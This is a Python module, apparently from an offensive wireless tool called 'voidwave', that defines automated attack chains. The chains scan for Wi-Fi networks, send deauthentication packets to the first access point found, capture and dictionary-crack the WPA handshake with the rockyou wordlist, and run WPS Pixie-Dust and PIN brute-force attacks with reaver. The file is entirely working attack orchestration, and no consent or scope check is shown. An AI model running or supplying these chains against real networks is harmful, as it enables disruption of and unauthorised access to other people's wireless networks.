"""Built-in wireless attack chains."""

from voidwave.chaining.models import (
    ChainDefinition,
    ChainStep,
    Condition,
    DataBinding,
    OnErrorBehavior,
)
from voidwave.chaining.registry import chain_registry


# WPA Handshake Capture Chain
wpa_capture_chain = ChainDefinition(
    id="wpa_capture",
    name="WPA Handshake Capture",
    description="Scan networks, target AP, deauth clients, capture handshake",
    target_type="interface",
    preflight_action="wireless_capture",
    tags=["wireless", "wpa", "handshake"],
    steps=[
        ChainStep(
            id="scan_networks",
            tool="airodump-ng",
            description="Discover wireless networks",
            options={
                "band": "abg",
                "write_interval": 1,
                "output_format": "csv",
            },
            timeout=30,
        ),
        ChainStep(
            id="target_capture",
            tool="airodump-ng",
            description="Capture packets from target AP",
            option_bindings=[
                DataBinding(
                    source_step="scan_networks",
                    source_path="networks[0].bssid",
                    target_option="bssid",
                ),
                DataBinding(
                    source_step="scan_networks",
                    source_path="networks[0].channel",
                    target_option="channel",
                ),
            ],
            options={
                "output_format": "pcap",
            },
            depends_on=["scan_networks"],
            parallel_with=["deauth_attack"],
            condition=Condition(
                source_step="scan_networks",
                check="count_gt",
                path="networks",
                value=0,
            ),
            timeout=120,
        ),
        ChainStep(
            id="deauth_attack",
            tool="aireplay-ng",
            description="Send deauthentication packets",
            option_bindings=[
                DataBinding(
                    source_step="scan_networks",
                    source_path="networks[0].bssid",
                    target_option="bssid",
                ),
            ],
            options={
                "attack": "deauth",
                "count": 10,
            },
            depends_on=["scan_networks"],
            condition=Condition(
                source_step="scan_networks",
                check="count_gt",
                path="networks",
                value=0,
            ),
            timeout=60,
        ),
    ],
)


# WPA Crack Chain (after handshake capture)
wpa_crack_chain = ChainDefinition(
    id="wpa_crack",
    name="WPA Handshake Crack",
    description="Crack captured WPA handshake with wordlist",
    target_type="file",
    tags=["wireless", "wpa", "cracking"],
    steps=[
        ChainStep(
            id="aircrack_attack",
            tool="aircrack-ng",
            description="Dictionary attack on handshake",
            options={
                "wordlist": "/usr/share/wordlists/rockyou.txt",
            },
            on_error=OnErrorBehavior.FALLBACK,
            fallback_tool="hashcat",
            timeout=3600,
        ),
    ],
)


# Full WPA Attack Chain
wpa_full_chain = ChainDefinition(
    id="wpa_full_attack",
    name="Full WPA Attack",
    description="Complete WPA attack: scan → capture → crack",
    target_type="interface",
    preflight_action="wireless_attack",
    tags=["wireless", "wpa", "full"],
    steps=[
        ChainStep(
            id="discover",
            tool="airodump-ng",
            description="Network discovery",
            options={
                "band": "abg",
            },
            timeout=30,
        ),
        ChainStep(
            id="capture",
            tool="airodump-ng",
            description="Handshake capture",
            option_bindings=[
                DataBinding(
                    source_step="discover",
                    source_path="networks[0].bssid",
                    target_option="bssid",
                ),
                DataBinding(
                    source_step="discover",
                    source_path="networks[0].channel",
                    target_option="channel",
                ),
            ],
            depends_on=["discover"],
            parallel_with=["deauth"],
            timeout=180,
        ),
        ChainStep(
            id="deauth",
            tool="aireplay-ng",
            description="Deauthentication",
            option_bindings=[
                DataBinding(
                    source_step="discover",
                    source_path="networks[0].bssid",
                    target_option="bssid",
                ),
            ],
            options={
                "attack": "deauth",
                "count": 20,
            },
            depends_on=["discover"],
            timeout=60,
        ),
        ChainStep(
            id="crack",
            tool="aircrack-ng",
            description="Crack handshake",
            option_bindings=[
                DataBinding(
                    source_step="capture",
                    source_path="capture_file",
                    target_option="capture_file",
                ),
            ],
            options={
                "wordlist": "/usr/share/wordlists/rockyou.txt",
            },
            depends_on=["capture", "deauth"],
            condition=Condition(
                source_step="capture",
                check="exists",
                path="handshake_captured",
            ),
            timeout=3600,
        ),
    ],
)


# WPS Attack Chain
wps_attack_chain = ChainDefinition(
    id="wps_attack",
    name="WPS Attack Pipeline",
    description="Scan for WPS-enabled networks and attack with Reaver",
    target_type="interface",
    preflight_action="wireless_wps",
    tags=["wireless", "wps", "reaver"],
    steps=[
        ChainStep(
            id="wps_scan",
            tool="wash",
            description="Scan for WPS-enabled APs",
            options={
                "scan_time": 30,
            },
            timeout=45,
        ),
        ChainStep(
            id="pixie_attack",
            tool="reaver",
            description="Pixie-Dust attack",
            option_bindings=[
                DataBinding(
                    source_step="wps_scan",
                    source_path="networks[0].bssid",
                    target_option="bssid",
                ),
                DataBinding(
                    source_step="wps_scan",
                    source_path="networks[0].channel",
                    target_option="channel",
                ),
            ],
            options={
                "pixie_dust": True,
            },
            depends_on=["wps_scan"],
            condition=Condition(
                source_step="wps_scan",
                check="count_gt",
                path="networks",
                value=0,
            ),
            on_error=OnErrorBehavior.SKIP,
            timeout=300,
        ),
        ChainStep(
            id="bruteforce_attack",
            tool="reaver",
            description="WPS PIN bruteforce",
            option_bindings=[
                DataBinding(
                    source_step="wps_scan",
                    source_path="networks[0].bssid",
                    target_option="bssid",
                ),
                DataBinding(
                    source_step="wps_scan",
                    source_path="networks[0].channel",
                    target_option="channel",
                ),
            ],
            options={
                "pixie_dust": False,
            },
            depends_on=["pixie_attack"],
            condition=Condition(
                source_step="pixie_attack",
                check="exists",
                path="pin",
                negate=True,  # Only run if pixie attack failed
            ),
            timeout=7200,
        ),
    ],
)


def register_wireless_chains() -> None:
    """Register all wireless chains."""
    chain_registry.register(wpa_capture_chain)
    chain_registry.register(wpa_crack_chain)
    chain_registry.register(wpa_full_chain)
    chain_registry.register(wps_attack_chain)
